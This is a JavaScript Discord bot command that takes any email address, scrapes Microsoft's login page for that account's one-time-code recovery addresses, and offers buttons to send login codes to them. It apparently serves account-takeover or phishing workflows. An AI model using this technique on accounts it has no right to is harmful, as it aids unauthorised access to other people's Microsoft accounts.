const { ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const axios = require("axios")
const generate = require("../../utils/generate");
const { queryParams } = require("../../../db/db");
module.exports = {
  name: "requestotp",
  description: "Request a OTP from your email",
  enabled: true,
  options: [
    {
      name: "email",
      description: "Email to send OTP to!",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
  ],
  userOnly: true,
  callback: async (client, interaction) => {
    let email = interaction.options.getString("email");
    const { data } = await axios({
      method: "GET",
      url: `https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&scope=openid&redirect_uri=https://www.office.com/landingv2&response_type=code&msproxy=1&username=${email}`,
    })
    try {
      const mat = data.match(/{"Username":.+?(}},)/);
      let profiles
      if (mat && mat[0]) {
        profiles = JSON.parse(mat[0].replace("}},", "}}"))
      } else {
        return interaction.reply({ content: `Invalid email.`, ephemeral: true })
      }

      if (!profiles?.Credentials?.OtcLoginEligibleProofs) {
        return interaction.reply({ content: `No security emails.`, ephemeral: true })
      }
      let buttons = [new ActionRowBuilder()]
      let i = 1
      for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
        if (i % 5 == 0) {
          let id = generate(32)
          await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `sendcode|${sec.data}`])
          buttons.push(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("action|" + id).setEmoji("📧").setLabel(sec.display).setStyle(ButtonStyle.Primary)))
        } else {
          let id = generate(32)
          await queryParams(`INSERT INTO actions(id,action) VALUES(?,?)`, [id, `sendcode|${sec.data}`])
          buttons[buttons.length - 1].addComponents(new ButtonBuilder().setCustomId("action|" + id).setEmoji("📧").setLabel(sec.display).setStyle(ButtonStyle.Primary))
        }
        i++
      }
      return interaction.reply({
        embeds: [{
          title: `${email}`,
          description: `Which security email should I send to?`,
          color: 0x13def3
        }],
        components: buttons,
        ephemeral: true
      })
    } catch (e) {
      return interaction.reply({ content: `Invalid email.`, ephemeral: true })
    }
  },
};
